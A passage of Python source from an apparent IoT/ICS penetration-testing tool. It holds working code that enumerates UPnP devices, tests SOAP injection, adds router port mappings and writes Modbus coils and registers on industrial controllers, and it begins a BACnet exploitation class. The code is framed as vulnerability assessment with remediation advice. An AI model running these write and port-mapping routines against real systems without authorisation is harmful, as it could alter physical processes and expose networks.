        for st in self.SEARCH_TARGETS:
            responses = self.msearch_discover(timeout=timeout, search_target=st)
            for resp in responses:
                location = resp.get("LOCATION", "")
                if location and location not in seen_locations:
                    seen_locations.add(location)
                    all_responses.append(resp)

        if all_responses:
            finding = IoTFinding(
                finding_type=FindingType.UPNP_EXPOSED,
                severity=Severity.MEDIUM,
                title=f"UPnP Devices Discovered: {len(all_responses)}",
                description=(
                    f"Discovered {len(all_responses)} UPnP-enabled devices on "
                    "the local network. UPnP services may expose sensitive "
                    "device control and configuration interfaces."
                ),
                target="network",
                protocol=IoTProtocol.UPNP,
                evidence=f"Locations: {list(seen_locations)[:10]}",
                remediation="Disable UPnP on all devices. Use manual port forwarding.",
                cvss_score=5.3,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)

        return all_responses

    def fetch_device_xml(self, location_url: str) -> Dict[str, Any]:
        """Fetch and parse UPnP device XML description."""
        device_info: Dict[str, Any] = {"url": location_url, "services": []}

        try:
            parsed = urlparse(location_url)
            host = parsed.hostname or ""
            port = parsed.port or 80
            path = parsed.path or "/"

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self._timeout)
            sock.connect((host, port))

            request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                "Connection: close\r\n"
                "\r\n"
            )
            sock.sendall(request.encode())

            response = b""
            while True:
                try:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break

            sock.close()
            text = response.decode("utf-8", errors="replace")

            # Extract device info using regex (no XML parser dependency)
            for tag in ["friendlyName", "manufacturer", "modelName",
                        "modelNumber", "modelDescription", "serialNumber",
                        "UDN", "deviceType", "presentationURL"]:
                match = re.search(rf"<{tag}>([^<]+)</{tag}>", text, re.IGNORECASE)
                if match:
                    device_info[tag] = match.group(1)

            # Extract services
            service_blocks = re.findall(
                r"<service>(.*?)</service>", text, re.DOTALL | re.IGNORECASE
            )
            for block in service_blocks:
                service: Dict[str, str] = {}
                for stag in ["serviceType", "serviceId", "controlURL",
                             "eventSubURL", "SCPDURL"]:
                    m = re.search(rf"<{stag}>([^<]+)</{stag}>", block, re.IGNORECASE)
                    if m:
                        service[stag] = m.group(1)
                if service:
                    device_info["services"].append(service)

            with self._lock:
                self._services.extend(device_info["services"])

            logger.info("Parsed device XML: %s (%s)",
                        device_info.get("friendlyName", "unknown"), location_url)

        except (OSError, ConnectionError) as e:
            logger.debug("Failed to fetch device XML %s: %s", location_url, e)
            device_info["error"] = str(e)

        return device_info

    def _build_soap_request(self, control_url: str, service_type: str,
                             action: str, arguments: Dict[str, str],
                             host: str, port: int) -> str:
        """Build a SOAP request for UPnP service invocation."""
        args_xml = ""
        for name, value in arguments.items():
            args_xml += f"<{name}>{value}</{name}>\n"

        body = (
            '<?xml version="1.0" encoding="utf-8"?>\n'
            '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
            's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\n'
            '<s:Body>\n'
            f'<u:{action} xmlns:u="{service_type}">\n'
            f'{args_xml}'
            f'</u:{action}>\n'
            '</s:Body>\n'
            '</s:Envelope>'
        )

        request = (
            f"POST {control_url} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            "Content-Type: text/xml; charset=\"utf-8\"\r\n"
            f'SOAPAction: "{service_type}#{action}"\r\n'
            f"Content-Length: {len(body)}\r\n"
            "\r\n"
            f"{body}"
        )
        return request

    def invoke_soap_action(self, host: str, port: int, control_url: str,
                            service_type: str, action: str,
                            arguments: Optional[Dict[str, str]] = None) -> str:
        """Invoke a SOAP action on a UPnP service."""
        if arguments is None:
            arguments = {}

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self._timeout)
            sock.connect((host, port))

            request = self._build_soap_request(
                control_url, service_type, action, arguments, host, port
            )
            sock.sendall(request.encode("utf-8"))

            response = b""
            while True:
                try:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break

            sock.close()
            return response.decode("utf-8", errors="replace")

        except (OSError, ConnectionError) as e:
            logger.debug("SOAP action failed %s:%d: %s", host, port, e)
            return ""

    def test_soap_injection(self, host: str, port: int, control_url: str,
                             service_type: str, action: str) -> List[IoTFinding]:
        """Test SOAP action for injection vulnerabilities."""
        injection_findings: List[IoTFinding] = []

        for payload in self.SOAP_INJECTION_PAYLOADS:
            args = {"NewValue": payload}
            response = self.invoke_soap_action(
                host, port, control_url, service_type, action, args
            )

            if response:
                # Check for error-based information disclosure
                error_patterns = [
                    r"<faultstring>([^<]+)</faultstring>",
                    r"<errorDescription>([^<]+)</errorDescription>",
                    r"<detail>([^<]+)</detail>",
                    r"stack trace", r"exception", r"error",
                ]
                for pattern in error_patterns:
                    match = re.search(pattern, response, re.IGNORECASE)
                    if match:
                        finding = IoTFinding(
                            finding_type=FindingType.UPNP_SOAP_INJECTION,
                            severity=Severity.HIGH,
                            title=f"UPnP SOAP Injection: {action}",
                            description=(
                                f"SOAP action '{action}' on {host}:{port} "
                                f"is vulnerable to injection. Payload: {payload[:50]}"
                            ),
                            target=host,
                            port=port,
                            protocol=IoTProtocol.UPNP,
                            evidence=f"Response: {match.group(0)[:200]}",
                            remediation=(
                                "Sanitize SOAP input. Implement allowlist "
                                "validation on action arguments."
                            ),
                            cvss_score=8.1,
                            confidence=0.7,
                        )
                        injection_findings.append(finding)
                        break

        with self._lock:
            self._findings.extend(injection_findings)
        return injection_findings

    def test_port_mapping_abuse(self, host: str, port: int,
                                  control_url: str,
                                  service_type: str) -> List[IoTFinding]:
        """Test if port mapping can be added/queried via UPnP IGD."""
        port_findings: List[IoTFinding] = []

        # Try to get existing port mappings
        for i in range(20):
            response = self.invoke_soap_action(
                host, port, control_url, service_type,
                "GetGenericPortMappingEntry",
                {"NewPortMappingIndex": str(i)}
            )
            if not response or "errorCode" in response.lower():
                break

            # Extract mapping details
            ext_port = re.search(r"<NewExternalPort>(\d+)</NewExternalPort>", response)
            int_port = re.search(r"<NewInternalPort>(\d+)</NewInternalPort>", response)
            int_client = re.search(r"<NewInternalClient>([^<]+)</NewInternalClient>", response)
            protocol = re.search(r"<NewProtocol>([^<]+)</NewProtocol>", response)

            if ext_port:
                finding = IoTFinding(
                    finding_type=FindingType.PORT_MAPPING_ABUSE,
                    severity=Severity.MEDIUM,
                    title=f"UPnP Port Mapping Enumerated: {ext_port.group(1)}",
                    description=(
                        f"Port mapping readable: ext={ext_port.group(1)} -> "
                        f"{int_client.group(1) if int_client else '?'}:"
                        f"{int_port.group(1) if int_port else '?'} "
                        f"({protocol.group(1) if protocol else '?'})"
                    ),
                    target=host,
                    port=port,
                    protocol=IoTProtocol.UPNP,
                    evidence=response[:300],
                    remediation="Disable UPnP IGD. Use manual port forwarding.",
                    cvss_score=5.3,
                    confidence=1.0,
                )
                port_findings.append(finding)

        # Try to add a port mapping (non-destructive test with high port)
        test_response = self.invoke_soap_action(
            host, port, control_url, service_type,
            "AddPortMapping",
            {
                "NewRemoteHost": "",
                "NewExternalPort": "49999",
                "NewProtocol": "TCP",
                "NewInternalPort": "49999",
                "NewInternalClient": "127.0.0.1",
                "NewEnabled": "1",
                "NewPortMappingDescription": "SIREN_TEST",
                "NewLeaseDuration": "60",
            }
        )

        if test_response and "errorCode" not in test_response.lower():
            finding = IoTFinding(
                finding_type=FindingType.PORT_MAPPING_ABUSE,
                severity=Severity.CRITICAL,
                title="UPnP Port Mapping Injection Possible",
                description=(
                    f"Successfully added port mapping via UPnP on {host}:{port}. "
                    "An attacker on the LAN can expose internal services to "
                    "the internet or redirect traffic."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.UPNP,
                evidence="AddPortMapping accepted without authentication",
                remediation="Disable UPnP IGD completely. Use manual NAT rules.",
                cvss_score=9.1,
                confidence=1.0,
            )
            port_findings.append(finding)

            # Clean up: delete the test mapping
            self.invoke_soap_action(
                host, port, control_url, service_type,
                "DeletePortMapping",
                {
                    "NewRemoteHost": "",
                    "NewExternalPort": "49999",
                    "NewProtocol": "TCP",
                }
            )

        with self._lock:
            self._findings.extend(port_findings)
        return port_findings

    def get_external_ip(self, host: str, port: int, control_url: str,
                         service_type: str) -> str:
        """Get external IP via UPnP GetExternalIPAddress."""
        response = self.invoke_soap_action(
            host, port, control_url, service_type,
            "GetExternalIPAddress"
        )
        match = re.search(r"<NewExternalIPAddress>([^<]+)</NewExternalIPAddress>",
                          response)
        if match:
            ext_ip = match.group(1)
            finding = IoTFinding(
                finding_type=FindingType.INFO_DISCLOSURE,
                severity=Severity.LOW,
                title=f"External IP Disclosed via UPnP: {ext_ip}",
                description=(
                    f"UPnP IGD on {host}:{port} discloses external IP: {ext_ip}"
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.UPNP,
                evidence=f"GetExternalIPAddress -> {ext_ip}",
                remediation="Disable UPnP.",
                cvss_score=3.1,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)
            return ext_ip
        return ""

    def full_test(self, target: str = "network") -> List[IoTFinding]:
        """Run full UPnP assessment."""
        results: List[IoTFinding] = []

        # 1. Discover all devices
        all_devices = self.discover_all()

        # 2. Fetch and parse device XML for each unique location
        parsed_devices: List[Dict[str, Any]] = []
        seen_locations: Set[str] = set()

        for resp in all_devices:
            location = resp.get("LOCATION", "")
            if location and location not in seen_locations:
                seen_locations.add(location)
                device_info = self.fetch_device_xml(location)
                if "error" not in device_info:
                    parsed_devices.append(device_info)

        # 3. Test each service
        for device in parsed_devices:
            parsed_url = urlparse(device.get("url", ""))
            d_host = parsed_url.hostname or ""
            d_port = parsed_url.port or 80

            for service in device.get("services", []):
                svc_type = service.get("serviceType", "")
                ctrl_url = service.get("controlURL", "")

                if not ctrl_url or not svc_type:
                    continue

                # Test WANIPConnection / WANPPPConnection for port mapping
                if "WANIPConnection" in svc_type or "WANPPPConnection" in svc_type:
                    self.test_port_mapping_abuse(d_host, d_port, ctrl_url, svc_type)
                    self.get_external_ip(d_host, d_port, ctrl_url, svc_type)

                # Test SOAP injection on all services
                common_actions = [
                    "GetStatusInfo", "GetConnectionTypeInfo",
                    "GetNATRSIPStatus", "SetConnectionType",
                ]
                for action in common_actions:
                    self.test_soap_injection(d_host, d_port, ctrl_url,
                                            svc_type, action)

        # Collect all findings
        with self._lock:
            results = list(self._findings)

        return results

    def get_findings(self) -> List[IoTFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize scanner state."""
        with self._lock:
            return {
                "findings": [f.to_dict() for f in self._findings],
                "discovered_devices": len(self._discovered_devices),
                "services": len(self._services),
            }


# ════════════════════════════════════════════════════════════════════════════════
# MODBUS EXPLOITER
# ════════════════════════════════════════════════════════════════════════════════

class ModbusExploiter:
    """
    Modbus/TCP exploitation engine.

    Tests Modbus devices for unauthorized register/coil read/write,
    device identification, and function code abuse (FC 1-6, 15-16, 43).

    Usage:
        modbus = ModbusExploiter()
        findings = modbus.full_test("192.168.1.10")
    """

    # Modbus exception codes
    EXCEPTION_CODES: Dict[int, str] = {
        1: "ILLEGAL FUNCTION",
        2: "ILLEGAL DATA ADDRESS",
        3: "ILLEGAL DATA VALUE",
        4: "SLAVE DEVICE FAILURE",
        5: "ACKNOWLEDGE",
        6: "SLAVE DEVICE BUSY",
        8: "MEMORY PARITY ERROR",
        10: "GATEWAY PATH UNAVAILABLE",
        11: "GATEWAY TARGET DEVICE FAILED TO RESPOND",
    }

    # Common Modbus register ranges by device type
    REGISTER_RANGES: List[Tuple[int, int, str]] = [
        (0, 100, "General configuration"),
        (100, 200, "System status"),
        (200, 300, "Setpoints"),
        (300, 400, "Input registers"),
        (400, 500, "Process values"),
        (1000, 1100, "Extended config"),
        (2000, 2100, "Alarm registers"),
        (3000, 3100, "Historical data"),
        (4000, 4100, "Communication parameters"),
        (9000, 9100, "Diagnostic registers"),
        (30001, 30100, "Input registers (3xxxx)"),
        (40001, 40100, "Holding registers (4xxxx)"),
    ]

    def __init__(self, timeout: float = DEFAULT_TIMEOUT) -> None:
        self._lock = threading.RLock()
        self._timeout = timeout
        self._findings: List[IoTFinding] = []
        self._transaction_id = 0
        self._readable_registers: Dict[int, int] = {}
        self._readable_coils: Dict[int, bool] = {}
        logger.info("ModbusExploiter initialized")

    def _next_transaction_id(self) -> int:
        """Get next Modbus transaction ID."""
        with self._lock:
            self._transaction_id = (self._transaction_id + 1) & 0xFFFF
            return self._transaction_id

    def _build_mbap_header(self, unit_id: int, pdu_length: int) -> bytes:
        """Build Modbus Application Protocol header."""
        tid = self._next_transaction_id()
        protocol_id = 0  # Modbus protocol
        length = pdu_length + 1  # PDU + unit ID
        return struct.pack("!HHHB", tid, protocol_id, length, unit_id)

    def _build_read_coils(self, unit_id: int, start: int,
                           count: int) -> bytes:
        """Build FC01 Read Coils request."""
        pdu = struct.pack("!BHH", ModbusFunction.READ_COILS, start, count)
        return self._build_mbap_header(unit_id, len(pdu)) + pdu

    def _build_read_discrete_inputs(self, unit_id: int, start: int,
                                      count: int) -> bytes:
        """Build FC02 Read Discrete Inputs request."""
        pdu = struct.pack("!BHH", ModbusFunction.READ_DISCRETE_INPUTS, start, count)
        return self._build_mbap_header(unit_id, len(pdu)) + pdu

    def _build_read_holding_registers(self, unit_id: int, start: int,
                                        count: int) -> bytes:
        """Build FC03 Read Holding Registers request."""
        pdu = struct.pack("!BHH", ModbusFunction.READ_HOLDING_REGISTERS, start, count)
        return self._build_mbap_header(unit_id, len(pdu)) + pdu

    def _build_read_input_registers(self, unit_id: int, start: int,
                                      count: int) -> bytes:
        """Build FC04 Read Input Registers request."""
        pdu = struct.pack("!BHH", ModbusFunction.READ_INPUT_REGISTERS, start, count)
        return self._build_mbap_header(unit_id, len(pdu)) + pdu

    def _build_write_single_coil(self, unit_id: int, address: int,
                                   value: bool) -> bytes:
        """Build FC05 Write Single Coil request."""
        coil_value = 0xFF00 if value else 0x0000
        pdu = struct.pack("!BHH", ModbusFunction.WRITE_SINGLE_COIL, address, coil_value)
        return self._build_mbap_header(unit_id, len(pdu)) + pdu

    def _build_write_single_register(self, unit_id: int, address: int,
                                       value: int) -> bytes:
        """Build FC06 Write Single Register request."""
        pdu = struct.pack("!BHH", ModbusFunction.WRITE_SINGLE_REGISTER, address, value)
        return self._build_mbap_header(unit_id, len(pdu)) + pdu

    def _build_write_multiple_coils(self, unit_id: int, start: int,
                                      values: List[bool]) -> bytes:
        """Build FC15 Write Multiple Coils request."""
        count = len(values)
        byte_count = (count + 7) // 8
        coil_bytes = bytearray(byte_count)
        for i, val in enumerate(values):
            if val:
                coil_bytes[i // 8] |= (1 << (i % 8))
        pdu = struct.pack("!BHHB", ModbusFunction.WRITE_MULTIPLE_COILS,
                           start, count, byte_count) + bytes(coil_bytes)
        return self._build_mbap_header(unit_id, len(pdu)) + pdu

    def _build_write_multiple_registers(self, unit_id: int, start: int,
                                          values: List[int]) -> bytes:
        """Build FC16 Write Multiple Registers request."""
        count = len(values)
        byte_count = count * 2
        reg_bytes = b""
        for v in values:
            reg_bytes += struct.pack("!H", v & 0xFFFF)
        pdu = struct.pack("!BHHB", ModbusFunction.WRITE_MULTIPLE_REGISTERS,
                           start, count, byte_count) + reg_bytes
        return self._build_mbap_header(unit_id, len(pdu)) + pdu

    def _build_read_device_id(self, unit_id: int,
                                object_id: int = 0) -> bytes:
        """Build FC43/14 Read Device Identification request."""
        # FC43, MEI type 14 (Read Device Identification)
        pdu = struct.pack("!BBBB", ModbusFunction.READ_DEVICE_ID,
                           0x0E, 0x01, object_id)
        return self._build_mbap_header(unit_id, len(pdu)) + pdu

    def _send_modbus(self, host: str, port: int, packet: bytes,
                      unit_id: int = 1) -> bytes:
        """Send Modbus/TCP packet and receive response."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self._timeout)
            sock.connect((host, port))
            sock.sendall(packet)
            response = sock.recv(4096)
            sock.close()
            return response
        except (OSError, ConnectionError) as e:
            logger.debug("Modbus send failed %s:%d: %s", host, port, e)
            return b""

    def _parse_register_response(self, data: bytes) -> List[int]:
        """Parse register values from Modbus response."""
        if len(data) < 9:
            return []
        # Check for exception
        fc = data[7]
        if fc & 0x80:
            return []
        byte_count = data[8]
        registers: List[int] = []
        offset = 9
        for _ in range(byte_count // 2):
            if offset + 2 <= len(data):
                val = struct.unpack("!H", data[offset:offset+2])[0]
                registers.append(val)
                offset += 2
        return registers

    def _parse_coil_response(self, data: bytes) -> List[bool]:
        """Parse coil values from Modbus response."""
        if len(data) < 9:
            return []
        fc = data[7]
        if fc & 0x80:
            return []
        byte_count = data[8]
        coils: List[bool] = []
        for i in range(byte_count):
            if 9 + i < len(data):
                byte_val = data[9 + i]
                for bit in range(8):
                    coils.append(bool(byte_val & (1 << bit)))
        return coils

    def _is_exception(self, data: bytes) -> Tuple[bool, int]:
        """Check if response is a Modbus exception."""
        if len(data) < 9:
            return False, 0
        fc = data[7]
        if fc & 0x80:
            exc_code = data[8] if len(data) > 8 else 0
            return True, exc_code
        return False, 0

    def read_coils(self, host: str, start: int = 0, count: int = 100,
                    port: int = MODBUS_DEFAULT_PORT,
                    unit_id: int = 1) -> List[bool]:
        """FC01: Read Coils."""
        pkt = self._build_read_coils(unit_id, start, count)
        resp = self._send_modbus(host, port, pkt, unit_id)
        coils = self._parse_coil_response(resp)

        if coils:
            with self._lock:
                for i, val in enumerate(coils):
                    self._readable_coils[start + i] = val

            finding = IoTFinding(
                finding_type=FindingType.MODBUS_NO_AUTH,
                severity=Severity.HIGH,
                title=f"Modbus Coils Readable: {start}-{start+count}",
                description=(
                    f"Read {len(coils)} coils from Modbus device {host}:{port} "
                    f"(unit {unit_id}) without authentication."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.MODBUS,
                evidence=f"Coils {start}-{start+len(coils)}: {coils[:20]}",
                remediation=(
                    "Implement Modbus/TCP access control. Use VPN or firewall "
                    "to restrict access. Consider Modbus/TCP security extensions."
                ),
                cvss_score=7.5,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)

        return coils

    def read_discrete_inputs(self, host: str, start: int = 0,
                               count: int = 100,
                               port: int = MODBUS_DEFAULT_PORT,
                               unit_id: int = 1) -> List[bool]:
        """FC02: Read Discrete Inputs."""
        pkt = self._build_read_discrete_inputs(unit_id, start, count)
        resp = self._send_modbus(host, port, pkt, unit_id)
        return self._parse_coil_response(resp)

    def read_holding_registers(self, host: str, start: int = 0,
                                 count: int = 100,
                                 port: int = MODBUS_DEFAULT_PORT,
                                 unit_id: int = 1) -> List[int]:
        """FC03: Read Holding Registers."""
        pkt = self._build_read_holding_registers(unit_id, start, count)
        resp = self._send_modbus(host, port, pkt, unit_id)
        registers = self._parse_register_response(resp)

        if registers:
            with self._lock:
                for i, val in enumerate(registers):
                    self._readable_registers[start + i] = val

            finding = IoTFinding(
                finding_type=FindingType.MODBUS_NO_AUTH,
                severity=Severity.HIGH,
                title=f"Modbus Holding Registers Readable: {start}-{start+count}",
                description=(
                    f"Read {len(registers)} holding registers from {host}:{port} "
                    f"(unit {unit_id}) without authentication."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.MODBUS,
                evidence=f"Registers {start}-{start+len(registers)}: {registers[:20]}",
                remediation=(
                    "Implement Modbus access control. Segment ICS network. "
                    "Deploy ICS-aware firewall or IDS."
                ),
                cvss_score=7.5,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)

        return registers

    def read_input_registers(self, host: str, start: int = 0,
                               count: int = 100,
                               port: int = MODBUS_DEFAULT_PORT,
                               unit_id: int = 1) -> List[int]:
        """FC04: Read Input Registers."""
        pkt = self._build_read_input_registers(unit_id, start, count)
        resp = self._send_modbus(host, port, pkt, unit_id)
        return self._parse_register_response(resp)

    def write_single_coil(self, host: str, address: int, value: bool,
                            port: int = MODBUS_DEFAULT_PORT,
                            unit_id: int = 1) -> bool:
        """FC05: Write Single Coil."""
        pkt = self._build_write_single_coil(unit_id, address, value)
        resp = self._send_modbus(host, port, pkt, unit_id)

        is_exc, exc_code = self._is_exception(resp)
        if not is_exc and len(resp) >= 12:
            finding = IoTFinding(
                finding_type=FindingType.MODBUS_WRITE_COIL,
                severity=Severity.CRITICAL,
                title=f"Modbus Coil Writable: address {address}",
                description=(
                    f"Successfully wrote coil at address {address} on "
                    f"{host}:{port} (unit {unit_id}). This could toggle "
                    "physical actuators, relays, or safety systems."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.MODBUS,
                evidence=f"FC05 Write Coil {address}={value} accepted",
                remediation=(
                    "CRITICAL: Restrict Modbus write access immediately. "
                    "Implement network segmentation and access control."
                ),
                cvss_score=10.0,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)
            return True

        return False

    def write_single_register(self, host: str, address: int, value: int,
                                port: int = MODBUS_DEFAULT_PORT,
                                unit_id: int = 1) -> bool:
        """FC06: Write Single Register."""
        pkt = self._build_write_single_register(unit_id, address, value)
        resp = self._send_modbus(host, port, pkt, unit_id)

        is_exc, exc_code = self._is_exception(resp)
        if not is_exc and len(resp) >= 12:
            finding = IoTFinding(
                finding_type=FindingType.MODBUS_WRITE_REGISTER,
                severity=Severity.CRITICAL,
                title=f"Modbus Register Writable: address {address}",
                description=(
                    f"Successfully wrote register at address {address} on "
                    f"{host}:{port} (unit {unit_id}). This could modify "
                    "setpoints, process parameters, or safety limits."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.MODBUS,
                evidence=f"FC06 Write Register {address}={value} accepted",
                remediation=(
                    "CRITICAL: Restrict Modbus write access immediately. "
                    "Implement OT network segmentation."
                ),
                cvss_score=10.0,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)
            return True

        return False

    def write_multiple_coils(self, host: str, start: int,
                               values: List[bool],
                               port: int = MODBUS_DEFAULT_PORT,
                               unit_id: int = 1) -> bool:
        """FC15: Write Multiple Coils."""
        pkt = self._build_write_multiple_coils(unit_id, start, values)
        resp = self._send_modbus(host, port, pkt, unit_id)

        is_exc, _ = self._is_exception(resp)
        if not is_exc and len(resp) >= 12:
            finding = IoTFinding(
                finding_type=FindingType.MODBUS_WRITE_COIL,
                severity=Severity.CRITICAL,
                title=f"Modbus Multiple Coils Writable: {start}-{start+len(values)}",
                description=(
                    f"Successfully wrote {len(values)} coils starting at "
                    f"address {start} on {host}:{port} (unit {unit_id})."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.MODBUS,
                evidence=f"FC15 Write {len(values)} coils at {start} accepted",
                remediation="Restrict Modbus FC15 write access.",
                cvss_score=10.0,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)
            return True

        return False

    def write_multiple_registers(self, host: str, start: int,
                                   values: List[int],
                                   port: int = MODBUS_DEFAULT_PORT,
                                   unit_id: int = 1) -> bool:
        """FC16: Write Multiple Registers."""
        pkt = self._build_write_multiple_registers(unit_id, start, values)
        resp = self._send_modbus(host, port, pkt, unit_id)

        is_exc, _ = self._is_exception(resp)
        if not is_exc and len(resp) >= 12:
            finding = IoTFinding(
                finding_type=FindingType.MODBUS_WRITE_REGISTER,
                severity=Severity.CRITICAL,
                title=f"Modbus Multiple Registers Writable: {start}-{start+len(values)}",
                description=(
                    f"Successfully wrote {len(values)} registers starting at "
                    f"address {start} on {host}:{port} (unit {unit_id})."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.MODBUS,
                evidence=f"FC16 Write {len(values)} registers at {start} accepted",
                remediation="Restrict Modbus FC16 write access.",
                cvss_score=10.0,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)
            return True

        return False

    def read_device_identification(self, host: str,
                                     port: int = MODBUS_DEFAULT_PORT,
                                     unit_id: int = 1) -> Dict[str, str]:
        """FC43: Read Device Identification."""
        device_info: Dict[str, str] = {}
        object_names = {
            0: "VendorName",
            1: "ProductCode",
            2: "MajorMinorRevision",
            3: "VendorUrl",
            4: "ProductName",
            5: "ModelName",
            6: "UserApplicationName",
        }

        for obj_id in range(7):
            pkt = self._build_read_device_id(unit_id, obj_id)
            resp = self._send_modbus(host, port, pkt, unit_id)

            if len(resp) < 15:
                continue

            is_exc, _ = self._is_exception(resp)
            if is_exc:
                continue

            # Parse MEI response
            try:
                # MBAP(7) + FC(1) + MEI(1) + ReadDevIdCode(1) + ConformityLevel(1)
                # + MoreFollows(1) + NextObjectId(1) + NumberOfObjects(1)
                offset = 7 + 1 + 1 + 1 + 1 + 1 + 1 + 1
                if offset < len(resp):
                    num_objects = resp[offset - 1]
                    for _ in range(num_objects):
                        if offset + 2 > len(resp):
                            break
                        oid = resp[offset]
                        olen = resp[offset + 1]
                        offset += 2
                        if offset + olen <= len(resp):
                            oval = resp[offset:offset + olen].decode(
                                "utf-8", errors="replace"
                            )
                            name = object_names.get(oid, f"Object_{oid}")
                            device_info[name] = oval
                            offset += olen
            except (IndexError, struct.error):
                pass

        if device_info:
            finding = IoTFinding(
                finding_type=FindingType.INFO_DISCLOSURE,
                severity=Severity.MEDIUM,
                title="Modbus Device Identification Disclosed",
                description=(
                    f"Device {host}:{port} (unit {unit_id}) discloses "
                    f"identification: {json.dumps(device_info)}"
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.MODBUS,
                evidence=json.dumps(device_info),
                remediation="Disable FC43 Read Device ID if not needed.",
                cvss_score=5.3,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)

        return device_info

    def scan_unit_ids(self, host: str, port: int = MODBUS_DEFAULT_PORT,
                       max_id: int = 247) -> List[int]:
        """Scan for active Modbus unit IDs (slave addresses)."""
        active_ids: List[int] = []

        for uid in range(1, min(max_id + 1, 248)):
            pkt = self._build_read_holding_registers(uid, 0, 1)
            resp = self._send_modbus(host, port, pkt, uid)

            if resp and len(resp) >= 9:
                is_exc, exc_code = self._is_exception(resp)
                # Unit responds even with exception (means it's alive)
                if not is_exc or exc_code in (1, 2, 3):
                    active_ids.append(uid)

        if active_ids:
            logger.info("Found %d active Modbus units on %s:%d",
                        len(active_ids), host, port)

        return active_ids

    def full_test(self, host: str, port: int = MODBUS_DEFAULT_PORT,
                   unit_id: int = 1) -> List[IoTFinding]:
        """Run all Modbus tests against a device."""
        results: List[IoTFinding] = []

        # 1. Device identification
        dev_info = self.read_device_identification(host, port, unit_id)

        # 2. Read coils (FC01)
        self.read_coils(host, 0, 100, port, unit_id)

        # 3. Read discrete inputs (FC02)
        inputs = self.read_discrete_inputs(host, 0, 100, port, unit_id)
        if inputs:
            results.append(IoTFinding(
                finding_type=FindingType.MODBUS_NO_AUTH,
                severity=Severity.HIGH,
                title="Modbus Discrete Inputs Readable",
                description=f"Read {len(inputs)} discrete inputs from {host}:{port}.",
                target=host, port=port, protocol=IoTProtocol.MODBUS,
                evidence=f"FC02 returned {len(inputs)} inputs",
                cvss_score=7.5, confidence=1.0,
            ))

        # 4. Read holding registers (FC03)
        for start, end, desc in self.REGISTER_RANGES[:6]:
            count = min(end - start, 125)
            self.read_holding_registers(host, start, count, port, unit_id)

        # 5. Read input registers (FC04)
        in_regs = self.read_input_registers(host, 0, 100, port, unit_id)
        if in_regs:
            results.append(IoTFinding(
                finding_type=FindingType.MODBUS_NO_AUTH,
                severity=Severity.MEDIUM,
                title="Modbus Input Registers Readable",
                description=f"Read {len(in_regs)} input registers from {host}:{port}.",
                target=host, port=port, protocol=IoTProtocol.MODBUS,
                evidence=f"FC04 returned {len(in_regs)} registers",
                cvss_score=5.3, confidence=1.0,
            ))

        # 6. Test write capabilities (with safe values)
        # Read current coil value first, then write same value back
        current_coils = self.read_coils(host, 0, 1, port, unit_id)
        if current_coils:
            self.write_single_coil(host, 0, current_coils[0], port, unit_id)

        # Read current register, write same value back
        current_regs = self.read_holding_registers(host, 0, 1, port, unit_id)
        if current_regs:
            self.write_single_register(host, 0, current_regs[0], port, unit_id)

        # 7. Scan for active unit IDs
        active = self.scan_unit_ids(host, port, max_id=10)
        if len(active) > 1:
            results.append(IoTFinding(
                finding_type=FindingType.INFO_DISCLOSURE,
                severity=Severity.LOW,
                title=f"Multiple Modbus Units Detected: {active}",
                description=f"Found {len(active)} active Modbus units on {host}:{port}.",
                target=host, port=port, protocol=IoTProtocol.MODBUS,
                evidence=f"Active units: {active}",
                cvss_score=3.1, confidence=1.0,
            ))

        # Collect all findings
        with self._lock:
            for f in self._findings:
                if f not in results:
                    results.append(f)

        return results

    def get_findings(self) -> List[IoTFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize exploiter state."""
        with self._lock:
            return {
                "findings": [f.to_dict() for f in self._findings],
                "readable_registers": len(self._readable_registers),
                "readable_coils": len(self._readable_coils),
                "transaction_id": self._transaction_id,
            }


# ════════════════════════════════════════════════════════════════════════════════
# BACnet SCANNER
# ════════════════════════════════════════════════════════════════════════════════

class BACnetScanner:
    """
    BACnet/IP scanning and exploitation engine.

    Tests BACnet devices for unauthorized Who-Is discovery, object
    enumeration, property read/write, priority array manipulation,
    and device reboot/reinitialize commands.

    Usage:
        bacnet = BACnetScanner()
        findings = bacnet.full_test("192.168.1.20")
    """

    # BACnet property identifiers
    PROP_OBJECT_IDENTIFIER = 75
    PROP_OBJECT_NAME = 77
    PROP_OBJECT_TYPE = 79
    PROP_PRESENT_VALUE = 85
    PROP_DESCRIPTION = 28
    PROP_DEVICE_TYPE = 31
    PROP_STATUS_FLAGS = 111
    PROP_PRIORITY_ARRAY = 87
    PROP_RELINQUISH_DEFAULT = 104
    PROP_VENDOR_NAME = 121
    PROP_VENDOR_ID = 120
    PROP_MODEL_NAME = 70
